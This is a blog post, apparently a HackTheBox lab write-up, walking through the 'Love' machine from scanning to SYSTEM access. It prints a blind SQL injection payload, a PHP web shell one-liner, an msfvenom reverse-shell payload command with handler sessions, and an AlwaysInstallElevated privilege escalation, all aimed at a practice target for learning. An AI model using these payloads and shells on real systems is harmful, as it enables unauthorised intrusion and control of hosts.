@@ -1,0 +1,456 @@
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>Love HackTheBox Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.87.0">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
+<button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<h2 class=blog-title>Love HackTheBox Walkthrough</h2>
+<p><span>August 9, 2021</span> by <span>Nasef</span></p>
+<img class=feature-image src=https://iamnasef.com/images/blog/013/featured-image.png alt=blog-feature-image>
+<p>Hello everybody !
+I am Nasef and today I am going to show you how I hacked Love machine from hack the box, so let&rsquo;s get started !</p>
+<h3 id=services-enumeration>Services Enumeration</h3>
+<p>Nmap found ports http(80) which is working fine
+https (443) not responsive but the certificate include a subdomain called staging.love.htb, So I added it to /etc/hosts.
+mysql(4406)
+smb (445)
+and another non responsive http(5000)</p>
+<pre><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
+Nmap scan report for love.htb (10.10.10.239)
+Host is up (0.18s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp open  mysql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|_    Host '10.10.14.7' is not allowed to connect to this MariaDB server
+5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3306-TCP:V=7.91%I=7%D=6/25%Time=60D69E36%P=x86_64-pc-linux-gnu%r(RT
+SF:SPRequest,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x2
+SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(RPCChe
+SF:ck,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowe
+SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSVersionBin
+SF:dReqTCP,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20a
+SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(DNSStatu
+SF:sRequestTCP,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\
+SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(Help
+SF:,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\
+SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SSLSessionReq,4
+SF:9,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x2
+SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(TerminalServerCoo
+SF:kie,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allow
+SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(TLSSessionRe
+SF:q,49,&quot;E\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed
+SF:\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(Kerberos,49,&quot;E
+SF:\0\0\x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\
+SF:x20connect\x20to\x20this\x20MariaDB\x20server&quot;)%r(SMBProgNeg,49,&quot;E\0\0\
+SF:x01\xffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20co
+SF:nnect\x20to\x20this\x20MariaDB\x20server&quot;)%r(X11Probe,49,&quot;E\0\0\x01\xff
+SF:j\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20connect\x
+SF:20to\x20this\x20MariaDB\x20server&quot;)%r(FourOhFourRequest,49,&quot;E\0\0\x01\x
+SF:ffj\x04Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20connect
+SF:\x20to\x20this\x20MariaDB\x20server&quot;)%r(LPDString,49,&quot;E\0\0\x01\xffj\x0
+SF:4Host\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20connect\x20to
+SF:\x20this\x20MariaDB\x20server&quot;)%r(LDAPSearchReq,49,&quot;E\0\0\x01\xffj\x04H
+SF:ost\x20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x
+SF:20this\x20MariaDB\x20server&quot;)%r(SIPOptions,49,&quot;E\0\0\x01\xffj\x04Host\x
+SF:20'10\.10\.14\.7'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20thi
+SF:s\x20MariaDB\x20server&quot;);
+Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h45m21s, deviation: 4h02m31s, median: 25m20s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-06-25T20:51:15-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-26T03:51:13
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 58.95 seconds
+</code></pre><p>I ran another nmap scan -sU for enumerating udp services.</p>
+<pre><code>nmap -sU 10.10.10.239
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
+Stats: 0:13:21 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
+UDP Scan Timing: About 76.21% done; ETC: 23:42 (0:04:10 remaining)
+Nmap scan report for love.htb (10.10.10.239)
+Host is up (0.18s latency).
+Not shown: 983 closed ports
+PORT      STATE         SERVICE
+123/udp   open|filtered ntp
+137/udp   open|filtered netbios-ns
+138/udp   open|filtered netbios-dgm
+500/udp   open|filtered isakmp
+1900/udp  open|filtered upnp
+4500/udp  open|filtered nat-t-ike
+5050/udp  open|filtered mmcc
+5353/udp  open|filtered zeroconf
+5355/udp  open|filtered llmnr
+16573/udp open|filtered unknown
+18888/udp open|filtered apc-necmp
+18987/udp open|filtered unknown
+22986/udp open|filtered unknown
+44253/udp open|filtered unknown
+49201/udp open|filtered unknown
+50497/udp open|filtered unknown
+59765/udp open|filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1086.41 seconds
+
+</code></pre><p>I ran another nmap scan -p- for enumerating the non-default .</p>
+<pre><code>nmap -p- 10.10.10.239
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 23:25 EDT
+Stats: 0:13:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 84.83% done; ETC: 23:41 (0:02:24 remaining)
+Stats: 0:13:28 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 84.86% done; ETC: 23:41 (0:02:24 remaining)
+Nmap scan report for love.htb (10.10.10.239)
+Host is up (0.18s latency).
+Not shown: 65516 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+443/tcp   open  https
+445/tcp   open  microsoft-ds
+3306/tcp  open  mysql
+5000/tcp  open  upnp
+5040/tcp  open  unknown
+5985/tcp  open  wsman
+5986/tcp  open  wsmans
+7680/tcp  open  pando-pub
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49668/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1258.78 seconds
+
+</code></pre><p>This concludes the service enumeration phase.</p>
+<h3 id=exploiting-http-service>Exploiting HTTP Service</h3>
+<p>Using the current information I decided to further enumerate the http service that was running on port 80.</p>
+<p>I ran gobuster to enumerate hidden directories, which gave me two directories /admin and /Admin each lead to login page</p>
+<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://love.htb/ -x php,txt,git
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://love.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,txt,git
+[+] Timeout:                 10s
+===============================================================
+2021/06/25 23:26:04 Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 330] [--&gt; http://love.htb/images/]
+/index.php            (Status: 200) [Size: 4388]                             
+/home.php             (Status: 302) [Size: 0] [--&gt; index.php]                
+/login.php            (Status: 302) [Size: 0] [--&gt; index.php]                
+/Images               (Status: 301) [Size: 330] [--&gt; http://love.htb/Images/]
+/admin                (Status: 301) [Size: 329] [--&gt; http://love.htb/admin/] 
+/Home.php             (Status: 302) [Size: 0] [--&gt; index.php]                
+/plugins              (Status: 301) [Size: 331] [--&gt; http://love.htb/plugins/]
+/includes             (Status: 301) [Size: 332] [--&gt; http://love.htb/includes/]
+/Index.php            (Status: 200) [Size: 4388]                               
+/Login.php            (Status: 302) [Size: 0] [--&gt; index.php]                  
+/examples             (Status: 503) [Size: 398]                                
+/logout.php           (Status: 302) [Size: 0] [--&gt; index.php]                  
+/preview.php          (Status: 302) [Size: 0] [--&gt; index.php]                  
+/dist                 (Status: 301) [Size: 328] [--&gt; http://love.htb/dist/]    
+/licenses             (Status: 403) [Size: 417]                                
+/IMAGES               (Status: 301) [Size: 330] [--&gt; http://love.htb/IMAGES/]  
+/%20                  (Status: 403) [Size: 298]                                
+/INDEX.php            (Status: 200) [Size: 4388]                               
+/Admin                (Status: 301) [Size: 329] [--&gt; http://love.htb/Admin/]   
+/*checkout*           (Status: 403) [Size: 298]                                
+/*checkout*.php       (Status: 403) [Size: 298]                                
+/*checkout*.txt       (Status: 403) [Size: 298]                                
+/*checkout*.git       (Status: 403) [Size: 298]                                
+/Plugins              (Status: 301) [Size: 331] [--&gt; http://love.htb/Plugins/] 
+/phpmyadmin           (Status: 403) [Size: 298]                                
+
+</code></pre><p><img src=/images/blog/013/1.png alt=image>
+I tried bruteforcing the credintial then tried running sqlmap and found that the login form in /Admin is vulnerable to blind sql injection and was able to retrive admin hash password but couldn&rsquo;t crack it.</p>
+<pre><code>Parameter: username (POST)
+Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: username=test' AND (SELECT 1316 FROM (SELECT(SLEEP(5)))jtCF) AND 'PbfS'='PbfS&amp;password=test&amp;login=
+</code></pre><p>I decided to switch into staging.love.htb, and found another form whish seems vulnerable to ssrf
+<img src=/images/blog/013/2.png alt=image></p>
+<p>I tried exploring the blocked http service that was running on port 5000 and it gave me a page with admin password !</p>
+<p><img src=/images/blog/013/3.png alt=image></p>
+<p>I used the credintials to login as an admin, and after some search I found file upload vulnerability which I used to upload my both shell.php</p>
+<pre><code>&lt;?php system($_REQUEST['nasef]);?&gt;
+</code></pre><p>and shell.exe that was generated via msfconsole</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
+
+</code></pre><p>I activated exploit/multi/handler</p>
+<pre><code>msf6 &gt; use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(multi/handler) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.14.7:4444 
+[*] Sending stage (175174 bytes) to 10.10.10.239
+[*] Meterpreter session 1 opened (10.10.14.7:4444 -&gt; 10.10.10.239:53374) at 2021-06-25 23:32:39 -0400
+[*] Sending stage (175174 bytes) to 10.10.10.239
+[*] Meterpreter session 2 opened (10.10.14.7:4444 -&gt; 10.10.10.239:53375) at 2021-06-25 23:32:42 -0400
+</code></pre><p>and activated the msfvenom shell by calling</p>
+<pre><code>http://love.htb/images/shell.php?nasef=shell.exe
+</code></pre><p>and voila I got user.txt</p>
+<pre><code>C:\Users\Phoebe\Desktop&gt;type user.txt
+type user.txt
+ae927b83b2802f562d38a1be36ef33b0
+</code></pre><h3 id=privilege-escalation>Privilege Escalation</h3>
+<p>Before running any heavy privesc scripts, I prefer going through my manual checklist. I checked for the reg entries of AlwaysInstallElevated And found that they were enabled !</p>
+<pre><code>C:\Users\Phoebe\Desktop&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+
+C:\Users\Phoebe\Desktop&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+</code></pre><p>So I ran the metasploit module AlwaysInstallElevated and got System permessions !</p>
+<pre><code>msf6 exploit(multi/handler) &gt; use exploit/windows/local/always_install_elevated
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/always_install_elevated) &gt; set LHOST tun0
+LHOST =&gt; tun0
+msf6 exploit(windows/local/always_install_elevated) &gt; set SESSION 2 
+SESSION =&gt; 2
+msf6 exploit(windows/local/always_install_elevated) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.14.7:4444 
+[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\jlhRVMB.msi ...
+[*] Executing MSI...
+[*] Sending stage (175174 bytes) to 10.10.10.239
+[*] Meterpreter session 3 opened (10.10.14.7:4444 -&gt; 10.10.10.239:53487) at 2021-06-25 23:35:15 -0400
+
+meterpreter &gt; shell
+Process 7880 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32&gt;whoami
+whoami
+nt authority\system
+
+C:\WINDOWS\system32&gt;cd C:\Users\Administrator
+cd C:\Users\Administrator
+
+C:\Users\Administrator&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 56DE-BA30
+
+ Directory of C:\Users\Administrator
+
+04/12/2021  03:00 PM    &lt;DIR&gt;          .
+04/12/2021  03:00 PM    &lt;DIR&gt;          ..
+04/12/2021  02:55 PM    &lt;DIR&gt;          3D Objects
+04/12/2021  02:55 PM    &lt;DIR&gt;          Contacts
+04/13/2021  03:20 AM    &lt;DIR&gt;          Desktop
+04/12/2021  02:55 PM    &lt;DIR&gt;          Documents
+04/13/2021  03:18 AM    &lt;DIR&gt;          Downloads
+04/12/2021  02:55 PM    &lt;DIR&gt;          Favorites
+04/12/2021  02:55 PM    &lt;DIR&gt;          Links
+04/12/2021  02:55 PM    &lt;DIR&gt;          Music
+04/13/2021  03:16 AM    &lt;DIR&gt;          OneDrive
+04/12/2021  02:57 PM    &lt;DIR&gt;          Pictures
+04/12/2021  02:55 PM    &lt;DIR&gt;          Saved Games
+04/12/2021  02:57 PM    &lt;DIR&gt;          Searches
+04/12/2021  02:55 PM    &lt;DIR&gt;          Videos
+               0 File(s)              0 bytes
+              15 Dir(s)   4,068,499,456 bytes free
+
+C:\Users\Administrator&gt;cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop&gt;type root.txt
+type root.txt
+c23a6389fc01a15fe85f3eae8289d18f
+</code></pre><p>Thank you for reading!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+<a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
+<a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
